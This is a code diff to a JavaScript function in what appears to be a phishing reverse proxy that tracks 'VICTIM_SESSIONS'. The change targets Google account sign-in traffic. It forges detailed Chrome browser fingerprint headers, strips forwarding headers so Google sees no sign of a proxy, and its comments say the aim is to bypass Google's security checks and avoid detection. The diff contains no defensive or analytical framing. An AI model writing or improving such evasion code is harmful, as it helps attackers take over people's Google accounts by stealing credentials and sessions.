@@ -1428,34 +1428,67 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
     // Special handling for Google accounts
     if (VICTIM_SESSIONS[currentSession].hostname === 'accounts.google.com' || 
         VICTIM_SESSIONS[currentSession].hostname === 'www.google.com') {
-        // Ensure critical headers for Google
+        // Google requires very specific headers to bypass security checks
+        
+        // Critical: Set proper Chrome user-agent with all details
+        proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+        
+        // Set all sec-ch-ua headers that Chrome sends
+        proxyRequestOptions.headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
+        proxyRequestOptions.headers['sec-ch-ua-mobile'] = '?0';
+        proxyRequestOptions.headers['sec-ch-ua-platform'] = '"Windows"';
+        proxyRequestOptions.headers['sec-ch-ua-platform-version'] = '"15.0.0"';
+        proxyRequestOptions.headers['sec-ch-ua-full-version'] = '"120.0.6099.130"';
+        proxyRequestOptions.headers['sec-ch-ua-arch'] = '"x86"';
+        proxyRequestOptions.headers['sec-ch-ua-bitness'] = '"64"';
+        proxyRequestOptions.headers['sec-ch-ua-model'] = '""';
+        proxyRequestOptions.headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
+        
+        // Accept headers
         if (!proxyRequestOptions.headers['accept']) {
-            proxyRequestOptions.headers['accept'] = '*/*';
+            proxyRequestOptions.headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
         }
-        if (!proxyRequestOptions.headers['accept-language']) {
-            proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
-        }
-        if (!proxyRequestOptions.headers['sec-fetch-dest']) {
+        proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
+        proxyRequestOptions.headers['accept-encoding'] = 'gzip, deflate, br';
+        
+        // Sec-Fetch headers must match Chrome exactly
+        if (proxyRequestOptions.path === '/' || proxyRequestOptions.path.includes('ServiceLogin')) {
+            proxyRequestOptions.headers['sec-fetch-dest'] = 'document';
+            proxyRequestOptions.headers['sec-fetch-mode'] = 'navigate';
+            proxyRequestOptions.headers['sec-fetch-site'] = 'none';
+            proxyRequestOptions.headers['sec-fetch-user'] = '?1';
+            proxyRequestOptions.headers['upgrade-insecure-requests'] = '1';
+        } else {
+            // For API calls
             proxyRequestOptions.headers['sec-fetch-dest'] = 'empty';
-        }
-        if (!proxyRequestOptions.headers['sec-fetch-mode']) {
             proxyRequestOptions.headers['sec-fetch-mode'] = 'cors';
-        }
-        if (!proxyRequestOptions.headers['sec-fetch-site']) {
             proxyRequestOptions.headers['sec-fetch-site'] = 'same-origin';
         }
-        // Google requires specific user-agent
-        if (!proxyRequestOptions.headers['user-agent'] || proxyRequestOptions.headers['user-agent'].includes('curl')) {
-            proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-        }
-        // Google uses x-same-domain header
+        
+        // Remove headers that might trigger detection
+        delete proxyRequestOptions.headers['x-forwarded-for'];
+        delete proxyRequestOptions.headers['x-real-ip'];
+        delete proxyRequestOptions.headers['via'];
+        delete proxyRequestOptions.headers['forwarded'];
+        
+        // Google-specific headers
         if (!proxyRequestOptions.headers['x-same-domain']) {
             proxyRequestOptions.headers['x-same-domain'] = '1';
         }
-        // Google-specific headers
-        if (!proxyRequestOptions.headers['google-accounts-xsrf']) {
+        
+        // Only add google-accounts-xsrf for POST requests
+        if (proxyRequestOptions.method === 'POST' && !proxyRequestOptions.headers['google-accounts-xsrf']) {
             proxyRequestOptions.headers['google-accounts-xsrf'] = '1';
         }
+        
+        // Add cache control
+        proxyRequestOptions.headers['cache-control'] = 'max-age=0';
+        
+        // Add DNT header
+        proxyRequestOptions.headers['dnt'] = '1';
+        
+        // Connection header
+        proxyRequestOptions.headers['connection'] = 'keep-alive';
     }
 }
 
